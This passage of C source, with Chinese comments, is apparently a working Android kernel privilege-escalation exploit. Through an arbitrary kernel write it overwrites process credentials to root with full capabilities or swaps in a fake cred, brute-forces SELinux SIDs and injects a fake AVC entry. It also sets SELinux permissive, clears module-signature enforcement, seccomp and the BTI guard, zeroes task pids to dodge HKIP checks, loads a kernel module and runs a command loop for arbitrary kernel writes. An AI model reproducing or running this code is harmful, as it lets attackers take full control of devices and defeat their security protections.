 * 因此不会触发 sescan 的 se_hooks 哈希比对，也不触发 HKIP 的代码完整性检查。 */
static int act_scan_bypass(void)
{
    uint64_t sl = slide_eff();
    uint64_t sk = RSKIP_OFF + sl;
    uint64_t se = SELSTATE_OFF + sl;
    uint64_t one = 0x0000000100000001ULL;   /* 两个 int 同时置 SKIP=1 */
    unsigned char z = 0;
    int rc = 0;
    rc |= aaw_write64(sk + 0x00, one);      /* kcode, syscall */
    rc |= aaw_write64(sk + 0x08, one);      /* se_hooks, se_status */
    rc |= aaw_write64(sk + 0x10, one);      /* rprocs, setid */
    rc |= aaw_write(se + 0x00, &z, 1);      /* enforcing / disabled */
    rc |= aaw_write(se + 0x01, &z, 1);      /* enforcing(若 DISABLE=y) / checkreqprot */
    printf("[A] scan bypass rc=%d skip=%#llx sel=%#llx\n",
           rc, (unsigned long long)sk, (unsigned long long)se);
    fflush(stdout);
    return rc;
}

/* -U AAWL: 按需重开 kmem 抓取 → 给 probe 发 SIGUSR1 让它做 setresgid(prepare_creds 新 cred)
 * → 收集记录后打印 probe 的 cred 地址与 probe task 地址。 */
static void aawl_leak(int32_t tid, int secs)
{
    int c = 0, ct = 0;
    relay_q("echo 0 > %s/tracing_on", TRACE_DIR);
    relay_q("echo 0 > %s/events/kmem/mm_page_alloc/enable", TRACE_DIR);
    relay_q("echo 0 > %s/events/kmem/mm_page_free/enable", TRACE_DIR);
    relay_q("echo 1 > %s/events/kmem/kmem_cache_alloc/enable", TRACE_DIR);
    relay_q("echo > %s/trace", TRACE_DIR);
    relay_q("echo 1 > %s/tracing_on", TRACE_DIR);
    usleep(40000);
    g_nrec = 0; g_dn = 0;
    leak_restart();
    usleep(20000);
    if (kill(tid, SIGUSR1) != 0)
        dprintf(1, "[L] kill(%d,SIGUSR1) errno=%d\n", (int)tid, errno);
    if (secs < 1) secs = 1;
    if (secs > 5) secs = 5;
    usleep((useconds_t)secs * 1000000u);
    leak_stop();
    relay_q("echo 0 > %s/events/kmem/kmem_cache_alloc/enable", TRACE_DIR);
    relay_q("echo 0 > %s/tracing_on", TRACE_DIR);
    uint64_t cr = pick_last(tid, 0, &c);
    uint64_t tk = pick_last(g_self_tid, 2, &ct);
    dprintf(1, "[L] tid=%d cred_recs=%d cred=%#llx | task_recs=%d ptask=%#llx\n",
            (int)tid, c, (unsigned long long)cr, ct, (unsigned long long)tk);
    fflush(stdout);
    printf("[L] cred 记录:\n"); fflush(stdout);
    dump_kind(tid, 0, 8); fflush(stdout);
    printf("[L] task 记录:\n"); fflush(stdout);
    dump_kind(g_self_tid, 2, 8); fflush(stdout);
}

/* 一键链（配合 -I -Y -U AAWX:<path>）：
 *   清 seccomp → 清 task->pid/tgid(HKIP idle 窗口) → 改 cred(uid0/gid2000/满caps) → 放行 probe exec。
 * 地址直接用进程内泄漏到的 g_probe_task / g_cred，不需要手工下发。 */
static void aawl_auto(void)
{
    if (!g_probe_task || !g_cred) {
        printf("[A] 缺地址 ptask=%#llx cred=%#llx（需 -Y 组合并泄漏成功）\n",
               (unsigned long long)g_probe_task, (unsigned long long)g_cred);
        fflush(stdout);
        return;
    }
    uint64_t t = g_probe_task, c = g_cred;
    uint64_t idw = 0x000007d000000000ULL;   /* 低4B=0(uid/suid/euid/fsuid), 高4B=2000(gid类) */
    uint64_t cap = 0x1ffffffffffULL;        /* CAP_FULL bit0..40 */
    int rc[16], i = 0;
    /* 不写 task+0x0（thread_info.flags）：整字写 0 会连 TIF_SIGPENDING/NEED_RESCHED 等一起清掉，
     * 没有读改写原语前风险大于收益；probe 继承自 adb shell，本身没有 seccomp 过滤器，
     * 下面两条 seccomp 清零已足够。 */
    rc[i++] = aaw_write64(t + 0xb00, 0);    /* seccomp.mode + filter_count */
    rc[i++] = aaw_write64(t + 0xb08, 0);    /* seccomp.filter */
    rc[i++] = aaw_write64(t + 0x878, 0);    /* task->pid + tgid: HKIP 按 idle 跳过 */
    rc[i++] = aaw_write64(c + 0x04, idw);   /* uid=0   gid=2000 */
    rc[i++] = aaw_write64(c + 0x0c, idw);   /* suid=0  sgid=2000 */
    rc[i++] = aaw_write64(c + 0x14, idw);   /* euid=0  egid=2000 */
    rc[i++] = aaw_write64(c + 0x1c, idw);   /* fsuid=0 fsgid=2000 */
    for (int k = 0; k < 5; k++)
        rc[i++] = aaw_write64(c + 0x28 + 8 * k, cap);
    printf("[A] task=%#llx cred=%#llx rcs=", (unsigned long long)t, (unsigned long long)c);
    for (int k = 0; k < i; k++) printf("%d", rc[k]);
    printf("\n");
    fflush(stdout);
    char wc = 1;
    int wr = (g_wake_fd[1] >= 0) ? (int)write(g_wake_fd[1], &wc, 1) : -1;
    printf("[A] wake fd=%d rc=%d -> probe 放行\n", g_wake_fd[1], wr);
    fflush(stdout);
}

/* -U AAWL：桥建好后常驻的命令循环。宿主（adb shell）往 /data/local/tmp/aawl.cmd
 * 写一行命令，本进程用桥提供的 AAW 执行，日志打出 rc，然后清空命令文件。
 *   q <addr_hex> <val_hex>   8 字节写
 *   s <addr_hex> <text>      字符串写(自动补 NUL)
 *   L <tid> [秒]             重开 kmem + 触发 tid 刷新 cred, 打印 cred/task 地址
 *   k <pid> <sig>            kill(pid, sig)
 *   w                        写 1 字节放行 probe(wake 管道) */
static void aawl_loop(void)
{
    const char *cf = "/data/local/tmp/aawl.cmd";
    printf("[X] AAWL 命令循环已启动 (cmd=%s exec=%s)\n", cf, g_uexec ? g_uexec : "-");
    fflush(stdout);
    for (;;) {
        char buf[512];
        int fd = open(cf, O_RDONLY);
        if (fd < 0) { usleep(200000); continue; }
        int n = (int)read(fd, buf, sizeof buf - 1);
        close(fd);
        if (n <= 0) { usleep(200000); continue; }
        buf[n] = 0;
        char *p = buf;
        while (p && *p) {
            char *nl = strchr(p, '\n');
            if (nl) *nl = 0;
            if (*p == 'q' && p[1] == ' ') {
                char *q = p + 2; while (*q == ' ') q++;
                uint64_t a = strtoull(q, &q, 16);
                while (*q == ' ') q++;
                uint64_t v = strtoull(q, NULL, 16);
                int rc = aaw_write64(a, v);
                dprintf(1, "[X] q %#llx <- %#llx rc=%d\n",
                        (unsigned long long)a, (unsigned long long)v, rc);
            } else if (*p == 's' && p[1] == ' ') {
                char *q = p + 2; while (*q == ' ') q++;
                uint64_t a = strtoull(q, &q, 16);
                while (*q == ' ') q++;
                int rc = aaw_write(a, q, (int)strlen(q) + 1);
                dprintf(1, "[X] s %#llx <- '%s' len=%d rc=%d\n",
                        (unsigned long long)a, q, (int)strlen(q) + 1, rc);
            } else if (*p == 'A' && (p[1] == 0 || p[1] == ' ')) {
                aawl_auto();
            } else if (*p == 'L' && p[1] == ' ') {
                char *q = p + 2;
                int32_t tid = (int32_t)strtol(q, &q, 10);
                int secs = (*q) ? (int)strtol(q + 1, NULL, 10) : 2;
                aawl_leak(tid, secs);
            } else if (*p == 'w' && (p[1] == 0 || p[1] == ' ')) {
                char wc = 1;
                int rc = (g_wake_fd[1] >= 0) ? (int)write(g_wake_fd[1], &wc, 1) : -1;
                dprintf(1, "[X] w wake fd=%d rc=%d\n", g_wake_fd[1], rc);
            } else if (*p == 'k' && p[1] == ' ') {
                char *q = p + 2;
                long kp = strtol(q, &q, 10);
                long ks = (*q) ? strtol(q + 1, NULL, 10) : 10;
                int rc = kill((pid_t)kp, (int)ks);
                dprintf(1, "[X] k %ld %ld rc=%d\n", kp, ks, rc);
            } else if (*p) {
                dprintf(1, "[X] 未知命令: %s\n", p);
            }
            fflush(stdout);
            p = nl ? nl + 1 : p + strlen(p);
        }
        int t = open(cf, O_WRONLY | O_TRUNC);
        if (t >= 0) close(t);
    }
}

/* -U: 桥建成后把 probe 子进程的 task->cred/real_cred 指向 init_cred
 *     （init_cred 的 security blob 是 kernel sid ⇒ uid0 + 全 caps + kernel 域，绕开 SELinux）。
 *     先写 probe->comm 回读校验 g_probe_task 可信，再动 cred；父进程永久驻留保住桥所在 pipe 页。 */
static int root_probe_patch(void)
{
    char path[64], buf[256];
    int fd, n, rc;
    uint64_t ic = INIT_CRED_OFF + slide_eff();
    unsigned char nm[8] = { 'R', 'O', 'O', 'T', 'P', 'R', 'B', 'E' };

    if (!g_probe_task) { printf("[U] g_probe_task=0（probe task 未泄漏），放弃\n"); return -1; }
    printf("[U] probe pid=%d task=%#llx init_cred=%#llx\n",
           (int)g_probe_pid, (unsigned long long)g_probe_task, (unsigned long long)ic);

    /* ① 地址校验：改 comm → 回读 /proc/<pid>/comm（写错地址也不至于崩） */
    rc = aaw_write(g_probe_task + TASK_COMM_OFF, nm, 8);
    printf("[U] comm write rc=%d target=%#llx\n", rc,
           (unsigned long long)(g_probe_task + TASK_COMM_OFF));
    if (rc) return -1;
    usleep(40000);
    snprintf(path, sizeof path, "/proc/%d/comm", (int)g_probe_pid);
    fd = open(path, O_RDONLY);
    n = fd >= 0 ? (int)read(fd, buf, sizeof buf - 1) : -1;
    if (fd >= 0) close(fd);
    buf[n > 0 ? n : 0] = 0;
    if (n > 0) { char *nl = strchr(buf, '\n'); if (nl) *nl = 0; }
    printf("[U] probe comm 回读='%s'\n", n > 0 ? buf : "?");
    /* comm 最多 15 字符，原名 wpAAAAAAABBBBBBBB 会留尾；只比对前 8 字节 */
    if (n <= 0 || memcmp(buf, "ROOTPRBE", 8)) {
        printf("[U] 地址校验失败（comm 未变），不写 cred\n");
        return -1;
    }

    /* ② 换 cred 指针(kernel 域) 或 就地改自身 cred(shell 域 uid0+全 caps) */
    if (g_caproot) {
        uint64_t caps = 0x1ffffffffffULL, zero = 0;
        if (!g_cred) { printf("[Q] g_cred=0（自身 cred 未泄漏），放弃\n"); return -1; }
        printf("[Q] 自身 cred=%#llx: ids->0 caps->%#llx (保持 shell 域, 可 exec)\n",
               (unsigned long long)g_cred, (unsigned long long)caps);
        rc  = 0;
        rc |= aaw_write64(g_cred + 0x4,  zero);   /* uid,gid */
        rc |= aaw_write64(g_cred + 0xc,  zero);   /* suid,sgid */
        rc |= aaw_write64(g_cred + 0x14, zero);   /* euid,egid */
        rc |= aaw_write64(g_cred + 0x1c, zero);   /* fsuid,fsgid */
        rc |= aaw_write64(g_cred + 0x24, zero);   /* securebits */
        rc |= aaw_write64(g_cred + 0x28, caps);   /* cap_inheritable */
        rc |= aaw_write64(g_cred + 0x30, caps);   /* cap_permitted */
        rc |= aaw_write64(g_cred + 0x38, caps);   /* cap_effective */
        rc |= aaw_write64(g_cred + 0x40, caps);   /* cap_bset */
        rc |= aaw_write64(g_cred + 0x48, caps);   /* cap_ambient */
        printf("[Q] cred 字段写入 rc=%d\n", rc);
        if (rc) return -1;
    } else {
        rc  = aaw_write64(g_probe_task + TASK_RCRED_OFF, ic);
        printf("[U] real_cred -> %#llx rc=%d\n", (unsigned long long)ic, rc);
        rc |= aaw_write64(g_probe_task + TASK_CRED_OFF, ic);
        printf("[U] cred      -> %#llx rc=%d\n", (unsigned long long)ic, rc);
        if (rc) return -1;
    }

    /* ③ 回读 probe 身份 */
    usleep(40000);
    snprintf(path, sizeof path, "/proc/%d/status", (int)g_probe_pid);
    fd = open(path, O_RDONLY);
    n = fd >= 0 ? (int)read(fd, buf, sizeof buf - 1) : -1;
    if (fd >= 0) close(fd);
    if (n > 0) {
        buf[n] = 0;
        const char *keys[] = { "Uid:", "Gid:", "CapEff:", "CapBnd:" };
        for (int k = 0; k < 4; k++) {
            char *q = strstr(buf, keys[k]);
            if (!q) continue;
            char *e = strchr(q, '\n');
            if (e) *e = 0;
            printf("[U] probe %s\n", q);
        }
    }
    snprintf(path, sizeof path, "/proc/%d/attr/current", (int)g_probe_pid);
    fd = open(path, O_RDONLY);
    n = fd >= 0 ? (int)read(fd, buf, sizeof buf - 1) : -1;
    if (fd >= 0) close(fd);
    if (n > 0) { buf[n] = 0; char *nl = strchr(buf, '\n'); if (nl) *nl = 0; }
    printf("[U] probe attr/current='%s'\n", n > 0 ? buf : "?");
    fflush(stdout);
    return 0;
}

static int aaw_write32(uint64_t target, uint32_t val)
{
    return aaw_write(target, &val, 4);
}

/* ============================ 方案二：伪 cred ============================
 * 与 root_probe_patch 的区别：cred 不是指向 init_cred，而是指向喷涂页里的伪 cred。
 * 伪 cred 自带 uid/gid=0、caps 全满、cred->security 指向同页的伪 tsec ⇒
 * 只要把 tsec->sid 改成 u:r:init:s0 那个 sid，probe 就是 uid0+满 caps+init 域。
 * sid 无法从 selinuxfs 查（/sys/fs/selinux/context 写 context 返回 rc=1），
 * 因此用本进程可读的 /proc/<pid>/attr/current 当 oracle，逐个 sid 试。
 * ===================================================================== */
#define FC_SID_MAX 2048     /* sidtab_hash_stats 实测 entries=2006，扫 4..2048 足够 */

static int  fc_diag_watch(int probe_pid, int secs);

/* 解析 /proc/<pid>/stat：comm、state、ppid、exit_code（僵尸也能读） */
static void fc_stat_line(int pid, char *nm, int nmsz, char *st, int *ppid, long *ec)
{
    char path[64], b[600];
    int fd, n;
    nm[0] = 0; *st = '?'; if (ppid) *ppid = -1; if (ec) *ec = -1;
    snprintf(path, sizeof path, "/proc/%d/stat", pid);
    fd = open(path, O_RDONLY);
    n = fd >= 0 ? (int)read(fd, b, sizeof b - 1) : -1;
    if (fd >= 0) close(fd);
    if (n <= 0) return;
    b[n] = 0;
    char *a = strchr(b, '('), *c2 = strrchr(b, ')');
    if (a && c2 && c2 > a) {
        int len = (int)(c2 - a - 1);
        if (len >= nmsz) len = nmsz - 1;
        memcpy(nm, a + 1, (size_t)len); nm[len] = 0;
    }
    char *s = c2 + 1;
    while (*s == ' ') s++;
    *st = *s;
    if (ppid) *ppid = (int)atol(s + 1);
    if (ec) {
        char *last = strrchr(b, ' ');
        if (last) *ec = atol(last + 1);
    }
}

static void fc_probe_state(int pid, char *nm, int nmsz, char *st)
{
    fc_stat_line(pid, nm, nmsz, st, NULL, NULL);
}

static int read_attr_current(int pid, char *out, size_t cap)
{
    char path[64];
    int fd, n;
    out[0] = 0;
    snprintf(path, sizeof path, "/proc/%d/attr/current", pid);
    fd = open(path, O_RDONLY);
    n = fd >= 0 ? (int)read(fd, out, cap - 1) : -1;
    if (fd >= 0) close(fd);
    if (n > 0) { out[n] = 0; char *nl = strchr(out, '\n'); if (nl) *nl = 0; }
    else { n = -1; out[0] = 0; }
    return n;
}

/* [单步实验] FSTOP=n：完成第 n 步后原地挂起，不唤醒 probe、不写后续步骤。
 * 用于二分定位「哪一处 AAW 写会踩坏元数据导致 panic」。
 * 1=sig_enforce 2=cred 交换 3=sid 4=pid/tgid清零 5=avc注入 */
static int fstop_want(int n)
{
    const char *s = getenv("FSTOP");
    return (s && *s && atoi(s) == n);
}

static void fstop_park(int n)
{
    printf("[F] FSTOP=%d 停在此步，保持挂起（不唤醒 probe/不写后续）\n", n);
    fflush(stdout);
    for (;;) sleep(3600);
}

static int fakecred_root(void)
{
    char path[64], buf[512], ctx[128];
    int fd, n, rc;
    unsigned char nm[8] = { 'R', 'O', 'O', 'T', 'P', 'R', 'B', 'E' };
    const char *want = getenv("SIDCTX");   /* SIDCTX=u:r:shell:s0 可切换目标域；默认 init */
    if (!want || !*want) want = "u:r:init:s0";

    if (!g_probe_task) { printf("[F] g_probe_task=0（probe task 未泄漏），放弃\n"); return -1; }
    if (!g_fc_va || !g_tsec_va) {
        printf("[F] 伪 cred 地址未知（模板未建或没有空闲块），放弃\n");
        return -1;
    }
    printf("[F] probe pid=%d task=%#llx fake_cred=%#llx tsec=%#llx\n",
           (int)g_probe_pid, (unsigned long long)g_probe_task,
           (unsigned long long)g_fc_va, (unsigned long long)g_tsec_va);

    /* ① 地址校验：改 comm → 回读 /proc/<pid>/comm
     * [实验] 跳过 comm 写入（wr99u2）：定位 comm write rc=0 后 40ms panic 是否由此步引起 */
    if (g_skip_comm) {
        printf("[F] [实验] 跳过 comm 写入/回读校验\n");
        goto fc_sig;
    }
    rc = aaw_write(g_probe_task + TASK_COMM_OFF, nm, 8);
    printf("[F] comm write rc=%d target=%#llx\n", rc,
           (unsigned long long)(g_probe_task + TASK_COMM_OFF));
    if (rc) return -1;
    usleep(40000);
    snprintf(path, sizeof path, "/proc/%d/comm", (int)g_probe_pid);
    fd = open(path, O_RDONLY);
    n = fd >= 0 ? (int)read(fd, buf, sizeof buf - 1) : -1;
    if (fd >= 0) close(fd);
    buf[n > 0 ? n : 0] = 0;
    if (n > 0) { char *nl = strchr(buf, '\n'); if (nl) *nl = 0; }
    printf("[F] probe comm 回读='%s'\n", n > 0 ? buf : "?");
    if (n <= 0 || memcmp(buf, "ROOTPRBE", 8)) {
        printf("[F] 地址校验失败（comm 未变），不写 cred\n");
        return -1;
    }

fc_sig:
    /* ② CONFIG_MODULE_SIG_FORCE=y：必须先清 sig_enforce，否则 init_module 必失败 */
    {
        uint64_t sig = SIG_ENFORCE_OFF + slide_eff();
        rc = aaw_write64(sig, 0);
        printf("[F] sig_enforce(%#llx) <- 0 rc=%d\n", (unsigned long long)sig, rc);
        if (rc) return -1;
        if (fstop_want(1)) fstop_park(1);
    }

    /* ③ 换 cred 指针：real_cred / cred → 本页伪 cred */
    rc  = aaw_write64(g_probe_task + TASK_RCRED_OFF, g_fc_va);
    printf("[F] real_cred -> %#llx rc=%d\n", (unsigned long long)g_fc_va, rc);
    rc |= aaw_write64(g_probe_task + TASK_CRED_OFF, g_fc_va);
    printf("[F] cred      -> %#llx rc=%d\n", (unsigned long long)g_fc_va, rc);
    if (rc) return -1;
    if (fstop_want(2)) fstop_park(2);

    /* [实验] 跳过 cred 交换后的 40ms 等待 + /proc status 回读（w93 成功链无此步） */
    if (g_skip_status) goto fc_sid;
    usleep(40000);
    snprintf(path, sizeof path, "/proc/%d/status", (int)g_probe_pid);
    fd = open(path, O_RDONLY);
    n = fd >= 0 ? (int)read(fd, buf, sizeof buf - 1) : -1;
    if (fd >= 0) close(fd);
    if (n > 0) {
        buf[n] = 0;
        const char *keys[] = { "Uid:", "Gid:", "CapEff:", "CapBnd:" };
        for (int k = 0; k < 4; k++) {
            char *q = strstr(buf, keys[k]);
            if (!q) continue;
            char *e = strchr(q, '\n');
            if (e) *e = 0;
            printf("[F] probe %s\n", q);
        }
    }

    /* ④ sid 扫描：每轮改 tsec->sid，再读 probe 的 attr/current 看上下文名。
     * 起点必须 >= 28（SECINITSID_NUM）：1..27 是 initial sids，其中 sid=1 是
     * u:r:kernel:s0，探针一旦落进 kernel 域会被 TEE 在 ~10ms 内静默清理
     * （2026-11-01 实测），扫到 1 就直接把探针弄死，永远到不了 init。
     * init/shell 等域 sid 是运行时 sidtab 动态分配的，从 28 开始按序增长。 */
fc_sid:
    int found = 0;
    /* SIDFIX=<n>：跳过扫描直接用已知 sid（init 的 sid 由 sidtab 按策略加载顺序
     * 分配，跨 boot 恒定，实测恒为 68）。扫描每轮一次 AAW 写 + 一次 /proc 读，
     * 是整条链里最长、最容易在这段时间被 TEE/panic 打断的环节，能省则省。 */
    {
        const char *sf = getenv("SIDFIX");
        if (sf && *sf) {
            int v = atoi(sf);
            if (v > 0) {
                if (aaw_write32(g_tsec_va + 4, (uint32_t)v) != 0) {
                    printf("[F] SIDFIX=%d 写入失败\n", v);
                    return -1;
                }
                found = v;
                printf("[F] SIDFIX 直取 sid=%d（跳过扫描）\n", v);
            }
        }
    }
    /* SIDAUTO=1：不看单一目标，扫全表并挑一个“能 exec /system/bin/sh”的域。
     * 优先级：init_shell > su > shell_su > shell。
     * 依据（本机 vmlinux 反汇编）：selinux_bprm_creds_for_exec 同 sid 走
     * SECCLASS_FILE(7)+FILE__EXECUTE_NO_TRANS，换域走 SECCLASS_PROCESS(2)+TRANSITION；
     * init→shell_exec 在策略里没有放行规则，所以 init 域 exec 必 EACCES。
     * 换成策略里本来就允许 exec shell 的域即可，完全无需伪造 AVC。
     * 同时把完整 sid→context 映射写到 /data/local/tmp/sidmap.txt（跨 boot 恒定，可复用）。 */
    if (!found && getenv("SIDAUTO") && atoi(getenv("SIDAUTO")) != 0) {
        static const char *prio[] = {
            "u:r:init_shell:s0", "u:r:su:s0", "u:r:shell_su:s0", "u:r:shell:s0"
        };
        int pn = (int)(sizeof prio / sizeof prio[0]);
        int psi[4];
        for (int i = 0; i < pn; i++) psi[i] = -1;
        FILE *mp = fopen("/data/local/tmp/sidmap.txt", "w");
        int send = FC_SID_MAX;
        const char *se = getenv("SIDEND");
        if (se && atoi(se) > 28) send = atoi(se);
        printf("[F] SIDAUTO 扫描 28..%d\n", send);
        for (int sid = 28; sid <= send; sid++) {
            if (aaw_write32(g_tsec_va + 4, (uint32_t)sid) != 0) break;
            int rn = read_attr_current((int)g_probe_pid, ctx, sizeof ctx);
            if (rn <= 0) continue;
            if (mp) fprintf(mp, "%d\t%s\n", sid, ctx);
            for (int i = 0; i < pn; i++) {
                if (psi[i] < 0 && !strcmp(ctx, prio[i])) {
                    psi[i] = sid;
                    printf("[F] ★ SIDAUTO 候选 sid=%d -> %s\n", sid, ctx);
                    fflush(stdout);
                }
            }
            if ((sid & 0x1ff) == 0) {
                printf("[F] SIDAUTO 扫描到 sid=%d（当前 attr='%s'）...\n", sid, ctx);
                fflush(stdout);
            }
        }
        if (mp) fclose(mp);
        for (int i = 0; i < pn && !found; i++)
            if (psi[i] >= 0) found = psi[i];
        if (found) {
            if (aaw_write32(g_tsec_va + 4, (uint32_t)found) != 0) {
                printf("[F] SIDAUTO 选中的 sid=%d 回写失败\n", found);
                return -1;
            }
            printf("[F] SIDAUTO 选用 sid=%d\n", found);
        }
    }
    for (int sid = 28; !found && sid <= FC_SID_MAX; sid++) {
        uint32_t sv = (uint32_t)sid;
        if (aaw_write32(g_tsec_va + 4, sv) != 0) {
            printf("[F] sid=%d 写入失败，中止扫描\n", sid);
            break;
        }
        int rn = read_attr_current((int)g_probe_pid, ctx, sizeof ctx);
        if (rn > 0 && !strcmp(ctx, want)) {
            found = sid;
            printf("[F] 命中 sid=%d -> %s ★\n", sid, ctx);
            break;
        }
        if ((sid & 0x1ff) == 0) {
            printf("[F] 扫描到 sid=%d（当前 attr='%s'）...\n", sid, rn > 0 ? ctx : "?");
            fflush(stdout);
        }
    }
    if (!found) {
        printf("[F] 28..%d 内未命中 %s（伪 cred 可能没落地 / sid 超出范围）\n",
               FC_SID_MAX, want);
        printf("[F] 最后 attr/current='%s'\n", ctx);
        fflush(stdout);
        return -1;
    }

    if (fstop_want(3)) fstop_park(3);

    /* ④b HKIP 窗口：uid0 的进程若 pid 仍是真实值，HKIP 的 hkip_check_xid_root
     * 会在首次权限检查（capable()/generic_permission）里直接 force_sig(9)，
     * 表现就是"唤醒后 ~10ms 静默死亡、无 AVC、无 panic"。这里把 task->pid/
     * tgid（0x878/0x87c，本机偏移）一并清零，让 HKIP 走 idle skip。
     * 代价：此后该进程绝不能退出/被 kill，否则 do_exit(pid=0) 会 panic。 */
    {
        uint64_t zp = 0;
        rc = aaw_write64(g_probe_task + 0x878, zp);
        printf("[F] task->pid/tgid(0x878) <- 0 rc=%d\n", rc);
        if (rc) return -1;
    }
    if (fstop_want(4)) fstop_park(4);

    /* ④c AVC 注入：把伪 avc_node 挂到 (sid,sid,system) 的哈希桶。
     * avc_lookup: hvalue=(ssid^(tsid<<2)^(tclass<<4))&0x1ff；槽位=&selinux_avc+8+hvalue*8；
     * 槽里存的是 node->list 的地址（container_of 偏移 0x28）。命中后 module_load 直接 allowed。 */
    if (!g_avc_node_va) {
        printf("[F] 伪 avc_node 未建（模板无空档），init_module 预计仍 EACCES\n");
    } else {
        uint32_t sid_u = (uint32_t)found;
        uint32_t hv = (sid_u ^ (sid_u << 2) ^ (uint32_t)(4u << 4)) & 0x1ffu;
        uint64_t slot = SELINUX_AVC_OFF + 8 + (uint64_t)hv * 8 + slide_eff();
        rc  = aaw_write64(g_avc_node_va, ((uint64_t)sid_u << 32) | sid_u);
        printf("[F] avc_node key ssid=tsid=%u rc=%d\n", sid_u, rc);
        /* hlist_node 在 0x28: next@0x28 / pprev@0x30。只写桶头却不写 pprev,
         * 任何摘链（avc_reclaim_node / avc_node_replace / avc_node_delete）都会
         * 执行 str next,[pprev] → 写 NULL（a13 的 panic 现场）。这里补上 pprev。 */
        rc |= aaw_write64(g_avc_node_va + 0x30, slot);
        printf("[F] avc_node pprev(+0x30) <- bucket %#llx rc=%d\n",
               (unsigned long long)slot, rc);
        rc |= aaw_write64(slot, g_avc_node_va + 0x28);
        printf("[F] avc slots[%u] @ %#llx -> fake_list %#llx rc=%d\n",
               hv, (unsigned long long)slot,
               (unsigned long long)(g_avc_node_va + 0x28), rc);
        if (rc) printf("[F] AVC 注入写失败，init_module 预计仍 EACCES\n");
    }
    /* ④c2 SELinux → permissive：写 0 到 selinux_state 头部。
     * CONFIG_SECURITY_SELINUX_DEVELOP=y（kallsyms 有 get_selinux_enforcing）。
     * 8 字节写 0 对两种布局都成立：DISABLE=y 时 disabled@0/enforcing@1，
     * DISABLE=n 时 enforcing@0；checkreqprot 同时归零属正常值。
     * 目的：让守护随后 exec /system/bin/sh 通过 domain_transition 检查。 */
    {
        uint64_t ss = SELINUX_STATE_OFF + slide_eff();
        int prc = aaw_write64(ss, 0);
        printf("[F] selinux_state@%#llx <- 0 (permissive) rc=%d\n",
               (unsigned long long)ss, prc);
    }
    if (fstop_want(5)) fstop_park(5);

    /* ④d a17: 关掉 BTI 守卫开关（只写数据，不改内核代码）
     * set_memory_x() 反汇编（link 0xffffffc01018410c）：
     *   ldar arm64_const_caps_ready(0x…6bc) ; cmp #1 ; b.lt → 位图路径
     *   ldar cpu_hwcap_keys[54](0x…660) >0 ? set_mask=PTE_GP(1<<50) : 0
     * 两步：① caps_ready 写 1，强制走 static key 路径；② key54 清 0。
     * [重要] a17/a17c 两次失败根因已定位：kaslr_self.sh 的 PRE1..3 少了 0x80000，
     *        导致 slide 恒偏大 0x80000，image 符号写全部偏 0x80000（写到了相邻页）。
     *        本版配合修正后的 kaslr_self.sh 使用。 */
    {
        uint64_t base   = 0xffffffc010000000ULL + slide_eff();
        uint64_t kready = base + 0x37fc6bcULL;      /* arm64_const_caps_ready */
        uint64_t k54    = base + 0x37fc660ULL;      /* cpu_hwcap_keys[54].enabled */
        int r1 = aaw_write32(kready, 1);
        int r2 = aaw_write32(k54, 0);
        printf("[A17] const_caps_ready %#llx <- 1 rc=%d | bti key %#llx <- 0 rc=%d\n",
               (unsigned long long)kready, r1, (unsigned long long)k54, r2);
        if (r1 || r2) printf("[A17] BTI 守卫未关掉，预计仍 BTI panic\n");
        fflush(stdout);
    }

    /* ⑤ 放行 probe：它此时 uid0+满 caps+init 域，直接 init_module(内存) */
    if (g_noload) {
        printf("[F] -k: 已走到「可加载 ko」状态（uid0/满caps/init域/AVC 已注入），"
               "按参数不唤醒 probe、不调 init_module\n");
        printf("[F] stage1+伪 cred 链验证完成 → 驻留(pipe/别名页保持占用, 不释放)\n");
        fflush(stdout);
        for (;;) sleep(60);   /* 驻留: 不 close pipe、不释放别名页，避免假节点悬空 */
    }
    if (g_wake_fd[1] >= 0) {
        ssize_t wrg = write(g_wake_fd[1], "G", 1);
        printf("[A] wake1 fd=%d rc=%ld errno=%d\n", g_wake_fd[1], (long)wrg, errno);
    }
    printf("[F] 已放行 probe 调 init_module（模块=%s）\n", g_modpath);
    fflush(stdout);

    /* ⑥ 轮询 probe 的 comm/状态：pipe 输出可能来不及被读走，comm 才是可靠证据 */
    if (g_fcdiag) {
        int nk = fc_diag_watch((int)g_probe_pid, 15);
        printf("[F] 诊断结束：扫到 %d 个探针/子进程\n", nk);
        fflush(stdout);
    } else {
    {
        char pnm[64], pst = '?', last[64] = "";
        long long t0 = now_us();
        for (int i = 0; i < 12000; i++) {             /* 2ms 采样，抓瞬时 comm（FC_OK/FC_E） */
            fc_probe_state((int)g_probe_pid, pnm, sizeof pnm, &pst);
            if (strcmp(pnm, last)) {
                snprintf(last, sizeof last, "%s", pnm);
                printf("[F] +%lldms comm='%s' state=%c\n",
                       (now_us() - t0) / 1000, pnm, pst);
                fflush(stdout);
            }
            if (pst == 'Z') { printf("[F] +%lldms probe 已死亡(state=Z)\n", (now_us() - t0) / 1000); break; }
            if (!strcmp(pnm, "FC_DONE")) { printf("[F] probe 走到 FC_DONE 且存活\n"); break; }
            usleep(2000);
        }
    }
    }
    return 0;
}

/* ---- probe 侧：仍在 shell 域时预读模块（父进程换 cred 后 init 域读不到 /data/local/tmp）---- */
static unsigned char *g_modbuf;
static int g_modlen;

static void fc_preload_module(void)
{
    int fd = open(g_modpath, O_RDONLY);
    if (fd < 0) {
        dprintf(1, "[F] open(%s) errno=%d(%s)\n", g_modpath, errno, strerror(errno));
        return;
    }
    off_t sz = lseek(fd, 0, SEEK_END);
    if (sz <= 0 || sz > (off_t)(64u << 20)) {
        dprintf(1, "[F] module size=%lld 异常，放弃预读\n", (long long)sz);
        close(fd);
        return;
    }
    /* MODMMAP=1：只建映射、不读内容。map 时在 shell 域做权限检查（通过），
     * 换 cred 后 init_module 里 copy_from_user 只触发缺页（page fault 不查权限）。
     * 好处：3.5MB 的页缓存/堆填充不在 UAF 窗口内发生。 */
    if (getenv("MODMMAP")) {
        void *m = mmap(NULL, (size_t)sz, PROT_READ, MAP_PRIVATE, fd, 0);
        close(fd);
        if (m == MAP_FAILED) {
            dprintf(1, "[F] mmap(%s) 失败 errno=%d(%s)\n", g_modpath, errno, strerror(errno));
            return;
        }
        g_modbuf = (unsigned char *)m;
        g_modlen = (int)sz;
        dprintf(1, "[F] module mmap %lld bytes @ %p（不预读内容）\n",
                (long long)sz, m);
        return;
    }
    lseek(fd, 0, SEEK_SET);
    g_modbuf = malloc((size_t)sz);
    if (!g_modbuf) { dprintf(1, "[F] malloc(%lld) 失败\n", (long long)sz); close(fd); return; }
    ssize_t got = 0;
    while (got < (ssize_t)sz) {
